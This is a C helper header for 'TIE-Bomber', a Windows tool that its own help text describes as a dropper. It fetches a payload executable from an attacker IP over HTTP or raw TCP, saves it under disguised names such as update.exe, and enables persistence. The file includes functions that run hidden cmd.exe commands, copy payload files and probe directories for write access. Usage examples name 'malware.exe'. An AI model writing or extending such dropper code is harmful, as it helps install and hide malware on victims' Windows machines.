#ifndef HELPER_H
#define HELPER_H

#include <windows.h>
#include <stdlib.h>
#include <shlwapi.h>
#include <lmcons.h>

#define MAX_URL 2048
#define MAX_FILE 255
#define MAX_REG_KEY_NAME 128
#define MAX_REG_VALUE_NAME 16383

#define WIN_ERROR 0x0
#define CONTINUE_ERROR 0x1 
#define FAIL_ERROR 0x2
#define SUCCESS 0x3

VOID TranslateErrorPrintImpl(DWORD errCode, const char *file, int line);
VOID TranslateErrorPrintImplStr(const char *errMsg, const char *file, int line);

#define TranslateErrorPrint(errCode) TranslateErrorPrintImpl(errCode, __FILE__, __LINE__);
#define TranslateErrorPrintStr(errMsg) TranslateErrorPrintImplStr(errMsg, __FILE__, __LINE__);
                
typedef int (*ValidatorFunc)(char *arg, void *data);

BOOL printHelp = TRUE;
static BOOL shutdownFlag = FALSE;

VOID TranslateError(DWORD errCode, char **pErrMessage) {
	FormatMessageA(
	    FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
	    NULL,
	    errCode,
	    0,
	    (LPSTR)pErrMessage,
	    0,
	    NULL);
}

VOID TranslateErrorPrintImplStr(const char* errMsg, const char *file, int line) {
    fprintf(stderr, "[-] ERROR at %s:%d: %s", file, line, errMsg);
}

VOID TranslateErrorPrintImpl(DWORD errCode, const char *file, int line) {
    char* errMsg;
    TranslateError(errCode, &errMsg);
    fprintf(stderr, "[-] ERROR at %s:%d: %lu - %s", file, line, errCode, errMsg);
    LocalFree(errMsg);
}

BOOL ExecuteCommand(const char* command) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    int commandLen = strlen(command);
    char execCmdCopy[commandLen + 16];
    const char* cmd = "cmd.exe /C ";

    int cmdLen = strlen(cmd);
    memcpy(execCmdCopy, cmd, cmdLen);

    memcpy(execCmdCopy + cmdLen, command, commandLen);
    execCmdCopy[cmdLen + commandLen] = '\0';

    printf("[!] Executing: %s\n", execCmdCopy);

    BOOL rc = CreateProcessA(
        NULL,
        (LPSTR) execCmdCopy,
        NULL, NULL, FALSE,
        CREATE_NO_WINDOW,
        NULL, NULL,
        &si, &pi
    );

    if (rc == FALSE) {
        TranslateErrorPrint(GetLastError());
        return FALSE;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Check exit exit code
    DWORD exitCode = 0;
    if (!GetExitCodeProcess(pi.hProcess, &exitCode)) {
        TranslateErrorPrint(GetLastError());
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return FALSE;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    if (exitCode != 0) {
        printf("[-] Command failed to execute (%lu). Try another option.\n", exitCode);
        return FALSE;
    }

    return TRUE;
}

BOOL CopyPayload(const char *srcPath, const char *dstPath) {
    FILE *src = fopen(srcPath, "rb");
    if (!src) {
        TranslateErrorPrintStr("Failed to open source file");
        return FALSE;
    }

    FILE *dst = fopen(dstPath, "wb");
    if (!dst) {
        TranslateErrorPrintStr("Failed to open destination file");
        fclose(src);
        return FALSE;
    }

    char buffer[4096];
    int bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), src)) > 0) {
        if (fwrite(buffer, 1, bytesRead, dst) != bytesRead) {
            TranslateErrorPrintStr("Error writing to destination file");
            fclose(src);
            fclose(dst);
            return FALSE;
        }
    }

    fclose(src);
    fclose(dst);
    return TRUE;
}

BOOL LocateBinary(char *binaryPath, const char *binary, DWORD binaryPathSize) {
    DWORD rc = SearchPathA(
        NULL,
        binary,
        NULL,
        binaryPathSize,
        binaryPath,
        NULL
    );

    if (!rc) {
        printf("[-] Binary %s not found!\n", binary);
    }
    
    return rc;
}

int HasWriteAccess(char *dirPath, void *data) {
    (void) data;

    char testPath[MAX_PATH + 1];
    if (dirPath[strlen(dirPath) - 1] != '\\') {
        dirPath[strlen(dirPath)] = '\\';
    }
    snprintf(testPath, MAX_PATH, "%s__perm__.tmp", dirPath);
    
    wchar_t wTestPath[MAX_PATH + 1];
    MultiByteToWideChar(CP_UTF8, 0, testPath, -1, wTestPath, MAX_PATH);

    HANDLE hFile = CreateFileW(
        wTestPath,
        FILE_WRITE_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        return WIN_ERROR;
    }

    CloseHandle(hFile);
    return SUCCESS;
}

VOID PrintHelp() {
    printf("Usage:\n");
    printf("  TIE-Bomber.exe -i <IP> -e <EXE> [options]\n\n");

    printf("Required arguments:\n");
    printf("  -i <IP>             IP address of the server to download the payload from.\n");
    printf("  -e <EXE>            Name of the executable to download (e.g., payload.exe).\n\n");

    printf("Optional arguments:\n");
    printf("  -t <TARGET PATH>    Full path where the payload should be saved.\n");
    printf("                      If omitted, name will not be changed.\n");
    printf("  -p <PORT>           Port number to connect to (default: 4444).\n");
    printf("  -s                  Use raw TCP sockets instead of HTTP or other protocols.\n");
    printf("  -P                  Enable persistence only (no download or connect).\n");
    printf("                      Note: when using -P, the -t option (target path) is required.\n\n");
    printf("  -h                  print this help message\n\n");

    printf("Examples:\n");
    printf("  dropper.exe -i 192.168.1.100 -e payload.exe -t C:\\Users\\Public\\drop.exe\n");
    printf("  dropper.exe -i 10.0.0.2 -e malware.exe -p 9001 -s\n");
    printf("  dropper.exe -P -t C:\\Windows\\Temp\\update.exe\n\n");
}

BOOL PromptUntilValid(const char *prompt, char* buffer, size_t bufferSize, ValidatorFunc validator, void *data, BOOL allowDefault) {
    int rc;
    puts("");
    while (!shutdownFlag) {
        printf("TIE-Bomber(%s) > ", prompt);
        fflush(stdout);
        fgets(buffer, (int)bufferSize, stdin);
        buffer[strcspn(buffer, "\n")] = '\0';
        if (*buffer == '\0' && allowDefault == FALSE) {
            continue;
        }
        if (strcmp(buffer, "q") == 0 || strcmp(buffer, "quit") == 0 || strcmp(buffer, "exit") == 0 || strcmp(buffer, "no") == 0 || strcmp(buffer, "n") == 0) {
                printf("\n[*] Exiting...\n");
                shutdownFlag = TRUE;
                return FALSE;
        }
        if (validator && strcmp(buffer, "h") == 0) {
            printHelp = TRUE;
        }
        
        if (!validator) {
            if (strcmp(buffer, "y") == 0 || strcmp(buffer, "yes") == 0) {
                break;
            }
            continue;   
        }    

        rc = validator(buffer, data);
        if (rc == WIN_ERROR) {
            TranslateErrorPrint(GetLastError());
            continue;
        } else if (rc == FAIL_ERROR) { 
            break;
        } else if (rc == CONTINUE_ERROR) {
            continue;
        }
        break;
    }
    puts("");
    return TRUE;
}


#endif // HELPER_H
